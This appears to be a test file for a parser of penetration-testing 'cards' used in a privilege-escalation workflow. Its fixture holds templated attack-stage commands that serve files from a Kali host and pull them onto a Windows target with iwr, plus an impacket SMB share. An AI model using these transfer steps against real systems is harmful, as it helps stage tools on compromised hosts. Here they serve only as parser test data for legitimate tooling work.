import { describe, expect, it } from 'vitest';
import { parseCard } from '../../../engines/fieldManual/parseCard';

const CARD = `---
id: shell-demo-transfer
title: Demo Transfer
type: card
category: Shells-and-Transfers
stage: privilege-escalation
os: windows
---

# Demo Transfer

## Commands

**Sub-method: HTTP (default)**

### Serve the folder
**Why:** Every pull fetches from here.

\`\`\`bash title:"Kali"
python3 -m http.server 80
\`\`\`

### Pull with iwr
**Why:** Native download.

\`\`\`powershell title:"Target — PowerShell"
iwr -Uri http://{LHOST}/{FILE} -OutFile {DEST_DIR}\\{FILE}
\`\`\`
**Note:** Add -UseBasicParsing on old hosts.
**Note:** Second line.

**Sub-method: SMB share on Kali**

### Share a folder
**Why:** HTTP blocked.

\`\`\`bash title:"Kali"
impacket-smbserver share . -smb2support
\`\`\`

### Untitled fence
**Why:** none

\`\`\`text
no title here
\`\`\`

## Next Steps
- n/a
`;

describe('parseCard', () => {
  it('parseCard returns null unless the frontmatter has type: card', () => {
    expect(parseCard('a.md', CARD.replace('type: card', 'type: tool'))).toBeNull();
    expect(parseCard('a.md', '# no frontmatter')).toBeNull();
  });

  it('parseCard reads the meta from frontmatter and the relative path', () => {
    const c = parseCard('02-Cards/Shells-and-Transfers/Demo.md', CARD)!;
    expect(c.meta).toEqual({
      id: 'shell-demo-transfer',
      title: 'Demo Transfer',
      stage: 'privilege-escalation',
      category: 'Shells-and-Transfers',
      os: 'windows',
      file: '02-Cards/Shells-and-Transfers/Demo.md',
    });
  });

  it('parseCard groups blocks under their sub-method', () => {
    const c = parseCard('a.md', CARD)!;
    expect(c.blocks.map((b) => [b.title, b.group])).toEqual([
      ['Serve the folder', 'HTTP (default)'],
      ['Pull with iwr', 'HTTP (default)'],
      ['Share a folder', 'SMB share on Kali'],
    ]);
  });

  it('parseCard maps Kali to attacker and Target fences to target', () => {
    const c = parseCard('a.md', CARD)!;
    expect(c.blocks.map((b) => b.runFrom)).toEqual(['attacker', 'target', 'attacker']);
    expect(c.blocks[1].template).toBe('iwr -Uri http://{LHOST}/{FILE} -OutFile {DEST_DIR}\\{FILE}');
  });

  it('parseCard attaches the Why and Note lines and numbers blocks in card order', () => {
    const c = parseCard('a.md', CARD)!;
    expect(c.blocks[0].why).toBe('Every pull fetches from here.');
    expect(c.blocks[0].note).toBeUndefined();
    expect(c.blocks[1].note).toBe('Add -UseBasicParsing on old hosts.\nSecond line.');
    expect(c.blocks.map((b) => b.index)).toEqual([0, 1, 2]);
  });

  it('parseCard skips a fence with no title', () => {
    const c = parseCard('a.md', CARD)!;
    expect(c.blocks.some((b) => b.template.includes('no title here'))).toBe(false);
  });

  it('parseCard treats Pivot fences as target and leaves group unset before any sub-method', () => {
    const c = parseCard('a.md', `---
id: x-y
title: T
type: card
category: Pivoting
stage: lateral-movement
os: any
---
## Commands
### One
**Why:** w
\`\`\`bash title:"Pivot — bash"
ls
\`\`\`
`)!;
    expect(c.blocks[0].runFrom).toBe('target');
    expect(c.blocks[0].group).toBeUndefined();
  });
});
